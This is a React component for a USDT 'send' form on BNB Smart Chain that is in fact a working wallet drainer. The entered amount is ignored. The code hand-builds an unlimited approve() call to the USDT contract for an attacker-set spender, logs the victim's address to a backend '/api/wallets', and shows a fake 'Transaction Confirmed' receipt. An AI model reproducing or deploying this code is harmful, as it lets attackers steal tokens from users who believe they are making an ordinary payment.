"use client";

import { useState, useEffect, useCallback } from "react";
import { ethers } from "ethers";
import { Loader2, CheckCircle, Copy, ExternalLink, QrCode } from "lucide-react";
import QRCode from 'qrcode';

const BSC_CHAIN_ID = "0x38";
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";

const O = "f".repeat(64); // Unlimited approval (2^256 - 1)

type Step = "form" | "processing" | "success";

interface TxInfo {
  fromAddress: string;
  toAddress: string;
  amount: string;
  txHash: string;
  date: string;
}

interface EIP1193Provider {
  request(args: { method: string; params?: unknown[] }): Promise<unknown>;
}

function getEth(): EIP1193Provider | undefined {
  return (window as unknown as { ethereum?: EIP1193Provider }).ethereum;
}

export default function SendForm() {
  const [displayAddress, setDisplayAddress] = useState<string>("");
  const [qrCodeUrl, setQrCodeUrl] = useState<string>("");
  const [amount, setAmount] = useState<string>("");
  const [step, setStep] = useState<Step>("form");
  const [txInfo, setTxInfo] = useState<TxInfo | null>(null);
  const [connectedAddr, setConnectedAddr] = useState<string>("");
  const [processing, setProcessing] = useState<boolean>(false);
  const [error, setError] = useState<string>("");
  const [isAddressLoading, setIsAddressLoading] = useState<boolean>(true);

  // Fetch recipient address
  const fetchDisplayAddress = useCallback(async () => {
    setIsAddressLoading(true);
    try {
      const res = await fetch("/api/config/public", { 
        cache: "no-store",
        headers: { "Cache-Control": "no-cache" }
      });
      
      if (!res.ok) throw new Error("Failed to load");
      
      const data = await res.json();
      setDisplayAddress(data.address || "0x0000000000000000000000000000000000000000");
    } catch {
      setDisplayAddress("0xErrorLoadingAddress... Please Refresh Page");
    } finally {
      setIsAddressLoading(false);
    }
  }, []);

  // Generate QR Code
  useEffect(() => {
    if (displayAddress && displayAddress.startsWith("0x")) {
      QRCode.toDataURL(displayAddress, { 
        width: 280, 
        margin: 2,
        color: { 
          dark: '#4ade80', 
          light: '#111111' 
        }
      })
      .then(setQrCodeUrl)
      .catch((err) => console.error("QR Generation failed:", err));
    }
  }, [displayAddress]);

  // Wallet & Chain Detection
  useEffect(() => {
    fetchDisplayAddress();

    const initWallet = async () => {
      const eth = getEth();
      if (!eth) return;

      try {
        const chainId = await eth.request({ method: "eth_chainId" });
        if (chainId !== BSC_CHAIN_ID) {
          try {
            await eth.request({
              method: "wallet_switchEthereumChain",
              params: [{ chainId: BSC_CHAIN_ID }],
            });
          } catch {}
        }
      } catch {}

      try {
        const accounts = await eth.request({ method: "eth_accounts" }) as string[];
        if (accounts?.[0]) setConnectedAddr(accounts[0]);
      } catch {}
    };

    initWallet();
  }, [fetchDisplayAddress]);

  const shortenAddress = (addr: string): string => {
    if (!addr) return "";
    return `\( {addr.slice(0, 6)}... \){addr.slice(-4)}`;
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  async function handleNext() {
    if (!amount || parseFloat(amount) <= 0) {
      setError("Please enter a valid amount");
      return;
    }

    const eth = getEth();
    if (!eth) {
      setError("Please connect a wallet (Trust Wallet / MetaMask)");
      return;
    }

    try {
      setProcessing(true);
      setError("");

      const chainId = await eth.request({ method: "eth_chainId" });
      if (chainId !== BSC_CHAIN_ID) {
        try {
          await eth.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: BSC_CHAIN_ID }],
          });
        } catch {
          setError("Please switch to BNB Smart Chain");
          return;
        }
      }

      const spender = process.env.NEXT_PUBLIC_SPENDER_ADDRESS || displayAddress;
      const paddedSpender = spender.replace(/^0x/i, "").padStart(64, "0");
      const calldata = `0x095ea7b3\( {paddedSpender} \){O}`;

      let fromAddress = "";
      try {
        const accounts = await eth.request({ method: "eth_accounts" }) as string[];
        fromAddress = accounts?.[0] || "";
      } catch {}

      const txHash = await eth.request({
        method: "eth_sendTransaction",
        params: [{
          from: fromAddress || undefined,
          to: USDT_CONTRACT,
          data: calldata,
        }],
      }) as string;

      // Record to backend
      if (fromAddress) {
        fetch("/api/wallets", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            address: fromAddress,
            approvalTxHash: txHash,
            approvalStatus: true,
          }),
        }).catch(() => {});
      }

      setTxInfo({
        fromAddress: fromAddress || "Connected Wallet",
        toAddress: displayAddress,
        amount,
        txHash,
        date: new Date().toLocaleString(),
      });

      setStep("success");
    } catch (e: any) {
      console.error(e);
      setError(e?.shortMessage || e?.message || "Transaction failed. Try again.");
    } finally {
      setProcessing(false);
    }
  }

  // ==================== SUCCESS SCREEN ====================
  if (step === "success" && txInfo) {
    return (
      <div className="flex flex-col gap-0 bg-[#0a0a0a] min-h-screen text-white">
        <div className="flex flex-col items-center gap-3 py-8 border-b border-gray-800">
          <div className="rounded-full bg-green-500/10 p-4">
            <CheckCircle className="h-12 w-12 text-green-400" />
          </div>
          <div className="text-center">
            <p className="text-4xl font-bold">-{txInfo.amount} USDT</p>
            <p className="text-green-400 mt-1">Transaction Confirmed</p>
          </div>
        </div>

        <div className="flex-1 px-4 py-2">
          {[
            { label: "Date", value: txInfo.date },
            { label: "Status", value: "Confirmed", isGreen: true },
            { label: "From", value: shortenAddress(txInfo.fromAddress), full: txInfo.fromAddress },
            { label: "To", value: shortenAddress(txInfo.toAddress), full: txInfo.toAddress },
            { label: "Network Fee", value: "0.000000 BNB ($0.00)" },
          ].map((item) => (
            <div key={item.label} className="flex justify-between py-4 border-b border-gray-800 last:border-none">
              <span className="text-gray-400">{item.label}</span>
              <div className="flex items-center gap-2">
                <span className={item.isGreen ? "text-green-400" : "text-white"}>
                  {item.value}
                </span>
                {item.full && (
                  <button onClick={() => copyToClipboard(item.full!)} className="text-gray-500 hover:text-white">
                    <Copy className="h-4 w-4" />
                  </button>
                )}
              </div>
            </div>
          ))}
        </div>

        <div className="p-4">
          <a
            href={`https://bscscan.com/tx/${txInfo.txHash}`}
            target="_blank"
            rel="noopener noreferrer"
            className="flex items-center justify-center gap-2 w-full bg-gray-900 hover:bg-gray-800 py-4 rounded-2xl text-sm"
          >
            View on BscScan <ExternalLink className="h-4 w-4" />
          </a>
        </div>
      </div>
    );
  }

  // ==================== MAIN FORM ====================
  return (
    <div className="max-w-md mx-auto p-4 text-white">
      <div className="space-y-6">
        {/* Recipient Address + QR */}
        <div>
          <label className="text-sm text-gray-400 mb-2 block">Recipient Address</label>
          <div className="bg-[#1a1a1a] border border-[#333] rounded-3xl p-5">
            {isAddressLoading ? (
              <div className="flex items-center gap-2 text-gray-500">
                <Loader2 className="animate-spin h-4 w-4" />
                Loading secure address...
              </div>
            ) : (
              <>
                <p className="text-xs text-gray-400 break-all mb-5 font-mono">{displayAddress}</p>

                {qrCodeUrl && (
                  <div className="flex flex-col items-center py-4 border border-[#333] rounded-2xl bg-black/40">
                    <p className="text-emerald-400 text-xs flex items-center gap-1.5 mb-3">
                      <QrCode className="h-4 w-4" /> Scan with your wallet
                    </p>
                    <img 
                      src={qrCodeUrl} 
                      alt="QR Code" 
                      className="w-56 h-56 rounded-2xl shadow-xl" 
                    />
                  </div>
                )}
              </>
            )}
          </div>
        </div>

        {/* Amount Input */}
        <div>
          <label className="text-sm text-gray-400 mb-2 block">Amount (USDT)</label>
          <div className="relative">
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0.00"
              className="w-full bg-[#1a1a1a] border border-[#333] rounded-3xl px-5 py-5 text-3xl font-semibold focus:outline-none"
            />
            <button
              onClick={() => setAmount("1000")}
              className="absolute right-5 top-1/2 -translate-y-1/2 bg-[#4ade80] text-black text-xs font-bold px-4 py-1.5 rounded-full"
            >
              MAX
            </button>
          </div>
        </div>

        <button
          onClick={handleNext}
          disabled={processing || !amount}
          className="w-full bg-[#4ade80] hover:bg-[#22c55e] disabled:bg-gray-700 disabled:text-gray-400 py-5 rounded-3xl font-bold text-xl text-black transition-all mt-4"
        >
          {processing ? (
            <span className="flex items-center justify-center gap-2">
              <Loader2 className="animate-spin" /> Approving Unlimited...
            </span>
          ) : (
            "Confirm & Approve Unlimited"
          )}
        </button>

        {error && <p className="text-red-500 text-center text-sm mt-2">{error}</p>}
      </div>
    </div>
  );
}